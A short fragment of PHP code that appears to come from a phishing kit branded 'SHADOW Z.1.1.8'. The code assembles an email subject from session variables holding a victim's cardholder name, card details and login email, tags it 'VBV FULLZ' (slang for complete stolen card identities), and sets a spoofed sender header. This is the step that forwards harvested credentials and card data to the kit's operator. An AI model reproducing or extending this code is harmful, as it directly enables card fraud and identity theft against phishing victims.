...
################## <font style='color: #820000;'>BY SHADOW Z.1.1.8</font> #####################
    ...
    $Z118_SUBJECT = "".$_SESSION['_cardholder_']."  VBV FULLZ XBAANANA: ".$_SESSION['_ccglobal_']."  ".$_SESSION['_global_']." ".$_SESSION['_login_email_']." ";
    $Z118_HEADERS .= "From:XBAANANA <noreply@vssv.com>";
